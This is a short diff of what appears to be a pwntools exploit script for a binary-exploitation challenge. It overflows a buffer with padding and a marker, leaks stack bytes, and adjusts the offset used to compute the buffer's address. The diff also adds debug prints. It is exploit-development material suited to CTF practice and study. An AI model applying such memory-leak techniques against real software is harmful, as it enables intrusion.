@@ -45,8 +45,9 @@ input("send second input")
 p.send(b'A' * 150 + b'BB')
 p.recvuntil(b'BB')
 addr = p.recv(6) + b'\x00' * 2
-stack = u64(addr) - 350
-print('addr: %#x' % stack)
+stack = u64(addr) - 325
+print('leak stack: %#x' % u64(addr))
+print('buffer@: %#x' % stack)
 print('len(addr) = ', len(addr))
 
 
